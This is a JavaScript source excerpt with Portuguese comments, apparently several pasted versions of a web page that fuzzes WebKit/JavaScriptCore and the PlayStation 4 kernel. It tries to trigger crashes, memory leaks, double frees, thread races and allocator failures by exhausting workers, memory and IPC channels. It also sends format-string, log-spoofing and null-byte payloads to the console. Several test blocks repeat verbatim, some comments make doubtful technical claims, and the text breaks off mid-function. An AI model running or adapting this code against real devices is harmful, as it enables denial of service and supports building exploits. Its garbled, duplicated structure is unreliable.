            log("[WebKit] Gerando função massiva (Profile Overflow)...");
            
            try {
                // Cria uma função com milhares de argumentos
                // O WebKit aloca estruturas de perfil para cada argumento/variável
                const args = Array.from({length: 2000}, (_, i) => "a" + i).join(",");
                const body = "return " + Array.from({length: 2000}, (_, i) => "a" + i).join("+") + ";";
                
                log("Compilando função...");
                const massiveFunc = new Function(args, body);
                
                log("Executando para gerar perfil...");
                // Chama com zeros
                const callArgs = new Array(2000).fill(1);
                massiveFunc(...callArgs);
                
                log("Função executada (Profile Alloc Seguro).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Socket 'Already Connected' Race ---
        // Alvo: "connection already in progress".
        // Tenta confundir a máquina de estados do socket.
        function runSocketRace() {
            log("[WebKit] Iniciando Socket State Race...");
            
            const url = "wss://echo.websocket.org";
            let ws = new WebSocket(url);
            
            // Tenta fechar e reabrir/enviar muito rápido
            const interval = setInterval(() => {
                try {
                    // Estado CONNECTING (0)
                    if (ws.readyState === 0) {
                        // Tenta enviar antes de abrir (deve falhar, mas estressa o check)
                        ws.send("Race");
                        // Fecha imediatamente
                        ws.close();
                    } else {
                        // Recria
                        ws = new WebSocket(url);
                    }
                } catch(e) {}
            }, 1); // 1ms
            
            setTimeout(() => {
                clearInterval(interval);
                log("Socket Race finalizada.");
            }, 3000);
        }

        // --- TESTE 4: Thread Red Zone Allocation Failure ---
        // Alvo: "Cannot allocate red zone for initial thread".
        // Tenta criar threads tão rápido que o kernel falha ao proteger a stack.
        function runRedZoneFail() {
            log("[KERNEL] Esgotando Red Zones (Thread init)...");
            
            const workerCode = `onmessage=()=>{}`;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria e mata imediatamente
                // O Kernel tenta alocar a stack e a red zone
                const w = new Worker(url);
                w.terminate(); 
                
                count++;
                if (count % 100 === 0) log(`Threads iniciadas/mortas: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Teste RedZone finalizado.");
                }
            }, 5);
        }

        // --- TESTE 5: Kernel Memory Leak Trigger ---
        // Alvo: "Warning: memory type %s leaked memory on destroy".
        // Cria objetos IPC, entrelaça-os e abandona-os para forçar leak no destroy.
        function runKernelLeak() {
            log("[KERNEL] Tentando Trigger de Memory Leak...");
            
            const channel = new MessageChannel();
            // Cria um arraybuffer grande para associar ao canal
            const bigBuf = new ArrayBuffer(1024 * 1024); // 1MB
            
            // Envia porta para si mesma (Ciclo no Kernel) com dados
            channel.port1.postMessage({buf: bigBuf}, [channel.port2, bigBuf]);
            
            // Perde todas as referências JS
            // O Kernel tem que destruir o canal e o buffer.
            // Se a lógica de ciclo falhar, o aviso de leak dispara (e a memória vaza).
            
            // Repete em loop
            const interval = setInterval(() => {
                const c = new MessageChannel();
                try {
                    c.port1.postMessage("leak", [c.port2]);
                } catch(e){}
            }, 10);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Leak trigger tentado. Verifique memória do sistema.");
            }, 5000);
        }

        // --- TESTE 6: 'Could not allocate' Stress ---
        // Alvo: "Could not allocate %u bytes" (Kernel).
        // Força falha de alocação contígua no Kernel.
        function runAllocFail() {
            log("[KERNEL] Estressando Alocador Contíguo...");
            
            const bigData = new Uint8Array(10 * 1024 * 1024).fill(0x41); // 10MB
            
            // Tenta enviar payloads gigantes via postMessage (cópia no Kernel)
            // Até o Kernel dizer "Não".
            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    w.postMessage(bigData); // Clona 10MB no Kernel space
                    count++;
                    if (count % 10 === 0) log(`Enviado: ${count * 10} MB`);
                } catch(e) {
                    log("Kernel recusou alocação: " + e.message);
                    clearInterval(interval);
                }
            }, 100);
        }
// --- TESTE 1: CodeBlock Profile Alloc Overflow ---
        // Alvo: JSC::UnlinkedCodeBlock::allocateSharedProfiles
        // Cria uma função com 10.000 argumentos para forçar uma alocação gigante de metadados.
        function runProfileFlood() {
            log("[WebKit] Iniciando Profile Alloc Overflow...");
            
            try {
                // Gera string de argumentos: "a0,a1,a2...a9999"
                const args = Array.from({length: 10000}, (_, i) => "a" + i).join(",");
                const body = "return 1;";
                
                log("Compilando função monstruosa...");
                // O parser JSC tem de alocar perfis de tipo para cada argumento
                const f = new Function(args, body);
                
                log("Função criada. Executando...");
                f();
                
                log("JSC sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: JSC Rope String Flatten Crash ---
        // Alvo: op_strcat (Concatenação preguiçosa)
        // O JSC usa "Rope Strings" (árvores de strings) para otimizar concatenação.
        // Forçar a "aplanagem" (flatten) de uma Rope gigante pode estourar o heap ou stack.
        function runRopeFlatten() {
            log("[WebKit] Criando Rope String gigante...");
            
            try {
                let s = "X";
                // Cria uma árvore binária de concatenações profundas
                // 2^25 chars = 32MB, mas a profundidade da árvore é o problema
                for(let i=0; i<25; i++) {
                    s = s + s; 
                }
                
                log("Rope criada. Forçando Flatten (acesso a char)...");
                // Acessar um caractere força o motor a resolver a árvore inteira
                const c = s[s.length - 1];
                
                log("Flatten OK. Char: " + c);
            } catch(e) {
                log("Erro Rope: " + e.message);
            }
        }

        // --- TESTE 3: gets_s Zero Buffer Trigger ---
        // Alvo: gets_s: zero buffer size
        // Tenta usar APIs que leem streams em buffers de tamanho 0.
        function runZeroBuffer() {
            log("[WebKit] Testando Zero Buffer Read...");
            
            if (!window.ReadableStream) return log("Streams API off.");
            
            const rs = new ReadableStream({
                start(c) {
                    c.enqueue(new Uint8Array([65, 66, 67]));
                    c.close();
                }
            });
            
            const reader = rs.getReader({mode: "byob"});
            // Buffer de tamanho ZERO
            const buf = new ArrayBuffer(0); 
            const view = new Uint8Array(buf);
            
            // O padrão diz que deve ler 0 bytes, mas a libc do PS4 (gets_s) pode pânico?
            reader.read(view).then(r => {
                log("Leitura zero completa (Seguro).");
            }).catch(e => {
                log("Erro Zero Read: " + e.message);
            });
        }

        // --- TESTE 4: OpenSSL Mutex Unlock Deadlock ---
        // Alvo: openssl:stl_wrapper.c:_rand_mtx_unlock()
        // Tenta matar a thread ENQUANTO ela está dentro da função crypto, segurando o lock.
        function runCryptoDeadlock() {
            log("[KERNEL] Atacando OpenSSL Mutex Unlock...");
            
            if (!window.crypto) return log("Crypto off.");
            
            const workerCode = `
                onmessage = () => {
                    const buf = new Uint8Array(1024*1024); // 1MB para demorar mais
                    // Loop infinito de crypto
                    while(true) crypto.getRandomValues(buf);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                w.postMessage("start");
                
                // Tenta acertar o timing onde o lock está adquirido
                // Terminate força a morte da thread. O Kernel limpa o mutex?
                setTimeout(() => w.terminate(), Math.random() * 20);
                
                count++;
                if (count % 10 === 0) log(`Tentativas de Deadlock: ${count}`);
                if (count > 200) {
                    clearInterval(interval);
                    log("Teste Crypto finalizado.");
                }
            }, 50);
        }

        // --- TESTE 5: TLS Block Allocation Exhaustion ---
        // Alvo: allocate_tls_block_to_dtv
        // Esgota a memória para Thread Local Storage.
        function runTLSBlock() {
            log("[KERNEL] Esgotando Blocos TLS...");
            
            // Intl.NumberFormat aloca cache em TLS
            const workerCode = `
                onmessage = () => {
                    const cache = [];
                    try {
                        for(let i=0; i<10000; i++) {
                            // Criação massiva de objetos dependentes de locale
                            cache.push(new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }));
                        }
                    } catch(e) {}
                    // Mantém vivo
                    setInterval(()=>{}, 1000);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers até o limite
            for(let i=0; i<50; i++) {
                new Worker(url).postMessage("go");
            }
            log("50 Workers alocando TLS massivo.");
        }

        // --- TESTE 6: Stack Red Zone Bypass ---
        // Alvo: Cannot allocate red zone for initial thread
        // Tenta pular a página de proteção da pilha (Red Zone) com alocações grandes.
        function runStackRedZone() {
            log("[KERNEL] Tentando Stack Red Zone Bypass...");
            
            const workerCode = `
                function recurse(depth) {
                    // Aloca array grande na STACK (não heap)
                    // Tenta pular a 'Red Zone' (geralmente 4KB ou 16KB)
                    // Se pularmos a guarda, escrevemos na memória de outra thread/kernel
                    const largeStackVar = new Float64Array(2048); // ~16KB
                    largeStackVar.fill(Math.random());
                    
                    if (depth > 0) recurse(depth - 1);
                }
                onmessage = () => {
                    try { recurse(1000); } catch(e) {}
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<10; i++) new Worker(url).postMessage("go");
            log("Workers a martelar a Stack Boundary.");
        }
 // --- TESTE 1: sprintf_s Bad Format Argument ---
        // Alvo: "sprintf_s: bad format argument"
        // Tenta passar um objeto que falha durante a conversão de string dentro do formatador.
        function runBadFormat() {
            log("[WebKit] Atacando sprintf_s (Bad Arg)...");
            
            const badObj = {
                toString: function() {
                    // Retorna outra string gigante ou lança erro
                    return "A".repeat(10000); 
                }
            };
            
            // Cria ciclo recursivo
            const recursiveObj = {};
            recursiveObj.self = recursiveObj;
            recursiveObj.toString = function() { return this.self; }; // Recursão infinita
            
            try {
                // console.log usa sprintf internamente para %s e %o
                // Tenta confundir o formatador com tipos instáveis
                console.log("Teste: %s %d %f", badObj, recursiveObj, NaN);
                console.warn("Recursive: %s", recursiveObj);
                
                log("Console sobreviveu.");
            } catch(e) {
                log("Erro (JS Catch): " + e.message);
            }
        }

        // --- TESTE 2: strcat_s Buffer Too Small ---
        // Alvo: "strcat_s: buffer too small"
        // Usa History API que concatena Base URL + Path + Hash.
        function runStrcatSmall() {
            log("[WebKit] Atacando strcat_s (Buffer Size)...");
            
            // Cria um título de estado gigante.
            // O sistema pode tentar concatenar "Title: " + "A..." num buffer fixo para a UI.
            const overflow = "X".repeat(65000); 
            
            try {
                log("Enviando título gigante para History...");
                history.replaceState(null, overflow, null);
                
                // Tenta ler de volta para ver se corrompeu ou truncou
                if (document.title !== overflow) {
                    log("Título truncado ou ignorado (Seguro).");
                }
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Momentum Event Logic Race ---
        // Alvo: "Generate momentum events in WebKit..."
        // Tenta criar conflito entre o scroll do sistema e o do WebKit.
        function runMomentumRace() {
            log("[WebKit] Iniciando Momentum Race...");
            const div = document.getElementById('scroll-dummy');
            
            let toggle = false;
            let i = 0;
            const interval = setInterval(() => {
                // Alterna violentamente entre scroll nativo e hidden
                // Enquanto forçamos scroll via JS
                div.style.overflowY = toggle ? 'scroll' : 'hidden';
                div.scrollTop = toggle ? 0 : 1000;
                
                // Dispara eventos de roda do mouse sintéticos
                div.dispatchEvent(new WheelEvent('wheel', {deltaY: 100}));
                
                toggle = !toggle;
                i++;
                
                if (i > 500) {
                    clearInterval(interval);
                    log("Momentum Race finalizada.");
                }
            }, 10);
        }

        // --- TESTE 4: Thread Leftover Data Leak ---
        // Alvo: "Thread %p has exited with leftover thread-specific data"
        // Isso confirma que o Kernel tem dificuldade em limpar TLS complexo.
        function runTLSLeak() {
            log("[KERNEL] Iniciando TLS Data Leak...");
            
            const workerCode = `
                onmessage = () => {
                    // Intl.DateTimeFormat aloca dados de locale no TLS da thread
                    const d = new Intl.DateTimeFormat('ja-JP-u-ca-japanese');
                    // Formata algo para garantir cache
                    d.format(new Date());
                    
                    // Termina abruptamente sem dar chance de limpeza JS
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Cria e mata threads rapidamente.
            // O Kernel vai acumular avisos de "leftover data" e vazar memória.
            let count = 0;
            const interval = setInterval(() => {
                for(let k=0; k<10; k++) {
                    new Worker(url).postMessage("go");
                }
                count += 10;
                if(count % 500 === 0) log(`Threads vazadas: ${count}`);
                
                if(count > 10000) {
                    clearInterval(interval);
                    log("Teste TLS Leak finalizado.");
                }
            }, 20);
        }

        // --- TESTE 5: HMD 'Already Connected' Race ---
        // Alvo: "HMD HID COMMAND is already connected"
        // Tenta confundir o estado do driver HMD/VR.
        function runHMDState() {
            log("[KERNEL] Atacando Estado HMD/VR...");
            
            if (navigator.getVRDisplays) {
                // Loop de polling de VR
                // Tenta "conectar" ao driver repetidamente
                const interval = setInterval(() => {
                    navigator.getVRDisplays();
                    // Se houver API de gamepad, usa também
                    if(navigator.getGamepads) navigator.getGamepads();
                }, 1);
                
                setTimeout(() => {
                    clearInterval(interval);
                    log("HMD Race finalizada.");
                }, 5000);
            } else {
                log("WebVR API não disponível.");
            }
        }

        // --- TESTE 6: Kernel Large Alloc Fail ---
        // Alvo: "Could not allocate %u bytes"
        // Tenta forçar a falha de alocação no Kernel Graphics Driver.
        function runHugeAlloc() {
            log("[KERNEL] Forçando Alocação Gigante (VRAM)...");
            
            try {
                // Tenta criar um ImageBitmap gigante
                // 32767x32767 pixels x 4 bytes = ~4GB
                // O Kernel deve recusar, mas se tentar alocar e falhar mal...
                const canvas = new OffscreenCanvas(32767, 32767); 
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = 'red';
                ctx.fillRect(0,0,1,1); // Força alocação real
                
                log("Canvas Gigante criado (Surpreendente!).");
            } catch(e) {
                log("Alocação recusada (Esperado): " + e.message);
            }
            
            // Tenta criar múltiplos menores para fragmentar
            const arr = [];
            try {
                for(let i=0; i<100; i++) {
                    arr.push(new OffscreenCanvas(4096, 4096)); // 64MB cada
                }
                log("Fragmentação VRAM iniciada.");
            } catch(e) {
                log("OOM VRAM atingido.");
            }
        }
// --- TESTE 1: sprintf_s Bad Format Argument ---
        // Alvo: "sprintf_s: bad format argument"
        // Tenta passar um objeto que falha durante a conversão de string dentro do formatador.
        function runBadFormat() {
            log("[WebKit] Atacando sprintf_s (Bad Arg)...");
            
            const badObj = {
                toString: function() {
                    // Retorna outra string gigante ou lança erro
                    return "A".repeat(10000); 
                }
            };
            
            // Cria ciclo recursivo
            const recursiveObj = {};
            recursiveObj.self = recursiveObj;
            recursiveObj.toString = function() { return this.self; }; // Recursão infinita
            
            try {
                // console.log usa sprintf internamente para %s e %o
                // Tenta confundir o formatador com tipos instáveis
                console.log("Teste: %s %d %f", badObj, recursiveObj, NaN);
                console.warn("Recursive: %s", recursiveObj);
                
                log("Console sobreviveu.");
            } catch(e) {
                log("Erro (JS Catch): " + e.message);
            }
        }

        // --- TESTE 2: strcat_s Buffer Too Small ---
        // Alvo: "strcat_s: buffer too small"
        // Usa History API que concatena Base URL + Path + Hash.
        function runStrcatSmall() {
            log("[WebKit] Atacando strcat_s (Buffer Size)...");
            
            // Cria um título de estado gigante.
            // O sistema pode tentar concatenar "Title: " + "A..." num buffer fixo para a UI.
            const overflow = "X".repeat(65000); 
            
            try {
                log("Enviando título gigante para History...");
                history.replaceState(null, overflow, null);
                
                // Tenta ler de volta para ver se corrompeu ou truncou
                if (document.title !== overflow) {
                    log("Título truncado ou ignorado (Seguro).");
                }
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Momentum Event Logic Race ---
        // Alvo: "Generate momentum events in WebKit..."
        // Tenta criar conflito entre o scroll do sistema e o do WebKit.
        function runMomentumRace() {
            log("[WebKit] Iniciando Momentum Race...");
            const div = document.getElementById('scroll-dummy');
            
            let toggle = false;
            let i = 0;
            const interval = setInterval(() => {
                // Alterna violentamente entre scroll nativo e hidden
                // Enquanto forçamos scroll via JS
                div.style.overflowY = toggle ? 'scroll' : 'hidden';
                div.scrollTop = toggle ? 0 : 1000;
                
                // Dispara eventos de roda do mouse sintéticos
                div.dispatchEvent(new WheelEvent('wheel', {deltaY: 100}));
                
                toggle = !toggle;
                i++;
                
                if (i > 500) {
                    clearInterval(interval);
                    log("Momentum Race finalizada.");
                }
            }, 10);
        }

        // --- TESTE 4: Thread Leftover Data Leak ---
        // Alvo: "Thread %p has exited with leftover thread-specific data"
        // Isso confirma que o Kernel tem dificuldade em limpar TLS complexo.
        function runTLSLeak() {
            log("[KERNEL] Iniciando TLS Data Leak...");
            
            const workerCode = `
                onmessage = () => {
                    // Intl.DateTimeFormat aloca dados de locale no TLS da thread
                    const d = new Intl.DateTimeFormat('ja-JP-u-ca-japanese');
                    // Formata algo para garantir cache
                    d.format(new Date());
                    
                    // Termina abruptamente sem dar chance de limpeza JS
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Cria e mata threads rapidamente.
            // O Kernel vai acumular avisos de "leftover data" e vazar memória.
            let count = 0;
            const interval = setInterval(() => {
                for(let k=0; k<10; k++) {
                    new Worker(url).postMessage("go");
                }
                count += 10;
                if(count % 500 === 0) log(`Threads vazadas: ${count}`);
                
                if(count > 10000) {
                    clearInterval(interval);
                    log("Teste TLS Leak finalizado.");
                }
            }, 20);
        }

        // --- TESTE 5: HMD 'Already Connected' Race ---
        // Alvo: "HMD HID COMMAND is already connected"
        // Tenta confundir o estado do driver HMD/VR.
        function runHMDState() {
            log("[KERNEL] Atacando Estado HMD/VR...");
            
            if (navigator.getVRDisplays) {
                // Loop de polling de VR
                // Tenta "conectar" ao driver repetidamente
                const interval = setInterval(() => {
                    navigator.getVRDisplays();
                    // Se houver API de gamepad, usa também
                    if(navigator.getGamepads) navigator.getGamepads();
                }, 1);
                
                setTimeout(() => {
                    clearInterval(interval);
                    log("HMD Race finalizada.");
                }, 5000);
            } else {
                log("WebVR API não disponível.");
            }
        }

        // --- TESTE 6: Kernel Large Alloc Fail ---
        // Alvo: "Could not allocate %u bytes"
        // Tenta forçar a falha de alocação no Kernel Graphics Driver.
        function runHugeAlloc() {
            log("[KERNEL] Forçando Alocação Gigante (VRAM)...");
            
            try {
                // Tenta criar um ImageBitmap gigante
                // 32767x32767 pixels x 4 bytes = ~4GB
                // O Kernel deve recusar, mas se tentar alocar e falhar mal...
                const canvas = new OffscreenCanvas(32767, 32767); 
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = 'red';
                ctx.fillRect(0,0,1,1); // Força alocação real
                
                log("Canvas Gigante criado (Surpreendente!).");
            } catch(e) {
                log("Alocação recusada (Esperado): " + e.message);
            }
            
            // Tenta criar múltiplos menores para fragmentar
            const arr = [];
            try {
                for(let i=0; i<100; i++) {
                    arr.push(new OffscreenCanvas(4096, 4096)); // 64MB cada
                }
                log("Fragmentação VRAM iniciada.");
            } catch(e) {
                log("OOM VRAM atingido.");
            }
        }
 // --- TESTE 1: JSC::CompleteSubspace::allocateSlow ---
        // Alvo: Forçar o caminho lento de alocação no JSC para expor bugs de gestão de memória.
        function runAllocSlow() {
            log("[WebKit] Forçando Alocação Lenta (Subspace Fragmentation)...");
            
            const arr = [];
            try {
                // Cria objetos de tamanhos variados para fragmentar as "Subspaces" do Heap
                for(let i=0; i<50000; i++) {
                    // Objetos pequenos, médios e grandes misturados
                    if (i % 3 === 0) arr.push({a:1}); 
                    else if (i % 3 === 1) arr.push({a:1, b:2, c:3, d:4, e:5});
                    else arr.push(new Array(100).fill(1));
                    
                    // Liberta buracos aleatórios para fragmentar
                    if (i % 5 === 0) arr[i-1] = null;
                }
                
                log("Heap Fragmentado. Forçando alocação crítica...");
                
                // Agora tenta alocar massivamente para forçar o 'allocateSlow'
                const stress = [];
                for(let i=0; i<10000; i++) stress.push(new Float64Array(64));
                
                log("Alocação completa (Seguro).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: System Console Injection ---
        // Alvo: "Log page messages to system console"
        // Tenta injetar caracteres de controle ou formatadores no log do sistema.
        function runConsoleInject() {
            log("[WebKit] Injetando no Log do Sistema...");
            
            // Strings perigosas para logs C (Format String, Newlines, Nulls)
            const payloads = [
                "%x %x %x %x", // Format String clássico
                "\n\n[KERNEL PANIC]\n\n", // Spoofing de log
                "A".repeat(2048), // Buffer overflow simples
                "\x00\x00\x00" // Null bytes
            ];
            
            payloads.forEach(p => {
                console.log("INJECT:", p);
                console.warn("WARN:", p);
                console.error("ERR:", p);
            });
            
            log("Payloads enviados para o syslog.");
        }

        // --- TESTE 3: WTF::AutomaticThread Exhaustion ---
        // Alvo: "WTF::AutomaticThread" (Template de threads do WebKit)
        // Tenta esgotar o pool de threads automáticas usadas por APIs auxiliares.
        function runAutoThread() {
            log("[WebKit] Esgotando AutomaticThreads...");
            
            // Image.decode() usa threads de background do WebKit
            const promises = [];
            const blob = new Blob(["fake_image_data"], {type: "image/png"});
            const url = URL.createObjectURL(blob); // URL inválida, mas dispara a thread
            
            for(let i=0; i<1000; i++) {
                const img = new Image();
                img.src = url;
                // Dispara decode em paralelo
                promises.push(img.decode().catch(()=>{}));
            }
            
            // Crypto também usa threads
            if(window.crypto && window.crypto.subtle) {
                for(let i=0; i<500; i++) {
                    promises.push(crypto.subtle.digest("SHA-256", new Uint8Array(10)).catch(()=>{}));
                }
            }
            
            Promise.all(promises).then(() => log("Threads retornaram (Seguro)."));
            log("1500 Tarefas de thread disparadas.");
        }

        // --- TESTE 4: [ScePthread] abort() Trigger ---
        // Alvo: "[ScePthread] abort() is called."
        // Tenta colocar uma thread num estado irrecuperável que force o aborto.
        function runPthreadAbort() {
            log("[KERNEL] Tentando Trigger Pthread Abort...");
            
            if (!window.SharedArrayBuffer) return log("SAB off.");
            
            const sab = new SharedArrayBuffer(4);
            const view = new Int32Array(sab);
            
            const workerCode = `
                function recurse(depth) {
                    // 1. Enche a stack profundamente
                    if (depth > 0) recurse(depth - 1);
                    else {
                        // 2. No fundo da stack, entra em espera atómica (Kernel Wait)
                        const view = new Int32Array(self.sab);
                        Atomics.wait(view, 0, 0); 
                    }
                }
                onmessage = (e) => {
                    self.sab = e.data;
                    try { recurse(2000); } catch(x){}
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança worker
            const w = new Worker(url);
            w.postMessage(sab);
            
            // Espera a thread entrar em 'wait' profundo
            setTimeout(() => {
                log("Matando thread em deep stack wait...");
                // 3. Termina violentamente.
                // O Kernel tem de desenrolar a stack e cancelar o wait. Se falhar -> abort()
                w.terminate();
            }, 1000);
        }

        // --- TESTE 5: Can't open console (Resource Starvation) ---
        // Alvo: "Can't open console"
        // Tenta impedir que o Kernel abra seu próprio dispositivo de log.
        function runConsoleOpenFail() {
            log("[KERNEL] Starving Console Device...");
            
            // 1. Esgota File Descriptors
            const fds = [];
            const interval = setInterval(() => {
                try {
                    fds.push(new MessageChannel());
                } catch(e) {
                    clearInterval(interval);
                    log("FDs esgotados. Iniciando spam de log...");
                    
                    // 2. Com FDs esgotados, força o sistema a tentar abrir /dev/console
                    // para reportar erros ou logs
                    for(let i=0; i<100; i++) console.error("FORCE_OPEN_CONSOLE_" + i);
                }
            }, 1);
        }

        // --- TESTE 6: Kernel Heap Stats Update Race ---
        // Alvo: "[STATS] max allocated size of heap..."
        // Cria flutuação rápida na memória do Kernel para bugar o contador.
        function runStatsRace() {
            log("[KERNEL] Racing Heap Statistics...");
            
            const workerCode = `
                onmessage = () => {
                    // Aloca/Liberta recursos do Kernel rapidamente
                    setInterval(() => {
                        const ch = new MessageChannel(); // Aloca
                        // Envia algo para alocar buffer
                        ch.port1.postMessage(new ArrayBuffer(1024));
                        // Fecha para libertar
                        ch.port1.close();
                        ch.port2.close();
                    }, 0);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Vários workers fazendo isso em paralelo para criar "ruído" nas estatísticas globais
            for(let i=0; i<20; i++) {
                new Worker(url).postMessage("go");
            }
            log("20 Workers a agitar o Heap do Kernel.");
        }
// --- TESTE 1: Momentum Scroll Event Logic Error ---
        // Alvo: "Generate momentum events in WebKit..."
        // Tenta confundir o cálculo de inércia do scroll.
        function runMomentumCrash() {
            log("[WebKit] Iniciando Momentum Crash...");
            const div = document.getElementById('scroll-box');
            
            // Simula um scroll "impossível":
            // Scroll para baixo, depois scroll para cima IMEDIATO, 
            // e muda o overflow para hidden no meio do evento.
            
            let toggle = false;
            const interval = setInterval(() => {
                try {
                    div.scrollTop = toggle ? 5000 : 0;
                    
                    // Dispara evento sintético de roda com delta alto (inércia)
                    div.dispatchEvent(new WheelEvent('wheel', {
                        deltaY: toggle ? 1000 : -1000,
                        deltaMode: 0 // Pixels
                    }));
                    
                    // Race: Muda propriedade de layout durante o evento
                    if (Math.random() > 0.5) {
                        div.style.overflow = 'hidden';
                        div.getBoundingClientRect(); // Força layout
                        div.style.overflow = 'scroll';
                    }
                    
                    toggle = !toggle;
                } catch(e) {}
            }, 5);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Momentum test finalizado.");
            }, 3000);
        }

        // --- TESTE 2: 'FATAL: attempt' Allocator Trigger ---
        // Alvo: "FATAL: attempt..." no JSC Allocator.
        // Tenta alocar um tamanho inválido ou negativo que escapa da verificação inicial JS.
        function runFatalAlloc() {
            log("[WebKit] Tentando trigger Fatal Alloc...");
            
            try {
                // Tenta alocações de borda (Edge Cases)
                // ArrayBuffer máximo seguro é ~2GB-1 no 32bit ou mais no 64bit
                // Tentamos valores que podem causar overflow de inteiro em cálculos internos
                const sizes = [
                    2147483647, // Max Int32
                    2147483648, // Max Int32 + 1
                    4294967295, // Max Uint32
                    Number.MAX_SAFE_INTEGER
                ];
                
                sizes.forEach(s => {
                    try {
                        const ab = new ArrayBuffer(s);
                        log(`Alloc ${s} OK (Inesperado).`);
                    } catch(e) {
                        // RangeError é o esperado. Queremos o FATAL crash.
                    }
                });
                
                // Tenta via WebAssembly (limites diferentes)
                if (window.WebAssembly) {
                    new WebAssembly.Memory({initial: 65536}); // Max Pages (~4GB)
                }
                
                log("Allocator stress concluído.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: System Suspend Logic Stress ---
        // Alvo: "system_suspend_phase2_pre_sync"
        // Simula a entrada em suspensão repetidamente para estressar os hooks do sistema.
        function runVisibilitySuspend() {
            log("[KERNEL] Simulando Suspend/Resume Stress...");
            
            // Usa a Page Visibility API para simular o browser indo para background/suspend
            // Isso dispara eventos de sistema de baixo nível
            
            const interval = setInterval(() => {
                // Infelizmente não podemos forçar 'visibilityState' via JS puro diretamente,
                // mas podemos criar iframes e destruí-los, ou usar requestAnimationFrame
                // de forma intermitente para simular "lags" de suspensão.
                
                // Carga pesada na GPU para simular estado de "jogo rodando"
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                if(gl) {
                    gl.clearColor(Math.random(), 0, 0, 1);
                    gl.clear(gl.COLOR_BUFFER_BIT);
                    // Força sincronização
                    gl.finish(); 
                }
                
                // Tenta enganar o scheduler com delays síncronos
                const start = performance.now();
                while(performance.now() - start < 20); // Bloqueia 20ms (micro-freeze)
                
            }, 50);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Suspend logic stress finalizado.");
            }, 5000);
        }

        // --- TESTE 4: Invalid Free Trigger (Kernel) ---
        // Alvo: "free: address %p has not been allocated"
        // Tenta enganar o Kernel para libertar um endereço inválido ou duplo.
        function runBadFree() {
            log("[KERNEL] Tentando Invalid Free (Double Free)...");
            
            const channel = new MessageChannel();
            const sab = new SharedArrayBuffer(4096);
            
            // O GOLPE: Enviar o MESMO buffer transferível duas vezes na mesma mensagem.
            // O WebKit deve bloquear, mas se passar para o Kernel IPC...
            try {
                // ArrayBuffer normal (transferível)
                const ab = new ArrayBuffer(1024);
                // Tenta transferir o mesmo handle duas vezes
                channel.port1.postMessage("attack", [ab, ab]);
                log("Double Transfer enviado (PERIGO).");
            } catch(e) {
                log("JS bloqueou Double Transfer (Seguro): " + e.message);
            }
            
            // Tenta via SharedWorker (IPC diferente)
            try {
                const w = new SharedWorker(URL.createObjectURL(new Blob([""],{type:"text/js"})));
                const ab2 = new ArrayBuffer(1024);
                w.port.postMessage("attack", [ab2, ab2]);
            } catch(e) {}
        }

        // --- TESTE 5: HMD 'Already Detached' Race ---
        // Alvo: "[HMDDFU_ERR]... already detached"
        // Tenta criar e destruir sessões VR rapidamente.
        function runHMDDetach() {
            log("[KERNEL] Atacando HMD Detach Logic...");
            
            if (!navigator.getVRDisplays) return log("VR API off.");
            
            let count = 0;
            const interval = setInterval(() => {
                // Solicita displays
                navigator.getVRDisplays().then(displays => {
                    if (displays.length > 0) {
                        // Se houver display (mesmo virtual), tenta apresentar e cancelar
                        displays[0].requestPresent([{source: document.createElement('canvas')}])
                            .then(() => {
                                // Cancela imediatamente (Detach race)
                                displays[0].exitPresent();
                            }).catch(()=>{});
                    }
                });
                
                count++;
                if (count > 200) {
                    clearInterval(interval);
                    log("HMD Race finalizada.");
                }
            }, 20);
        }

        // --- TESTE 6: TLS Deallocation Race ---
        // Alvo: "deallocate_tls_block_from_dtv"
        // Estressa a limpeza de memória local da thread.
        function runTLSDealloc() {
            log("[KERNEL] Iniciando TLS Dealloc Race...");
            
            const workerCode = `
                onmessage = () => {
                    // Aloca muito TLS
                    const x = new Intl.DateTimeFormat();
                    // Suicídio rápido
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Cria workers em rajadas
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    new Worker(url).postMessage("go");
                }
            }, 10);
            
            setTimeout(() => {
                clearInterval(interval);
                log("TLS Race finalizada.");
            }, 3000);
        }
// --- TESTE 1: SharedWorkerThreadProxy C++ Race ---
        // Alvo: O proxy C++ que gere a thread do SharedWorker.
        // Tenta destruir a ligação enquanto mensagens pesadas estão em trânsito.
        function runSharedProxyRace() {
            log("[WebKit] Atacando SharedWorkerThreadProxy...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Mantém o proxy ocupado serializando
                    postMessage({data: new Array(10000).fill(1.1)});
                }
            `;
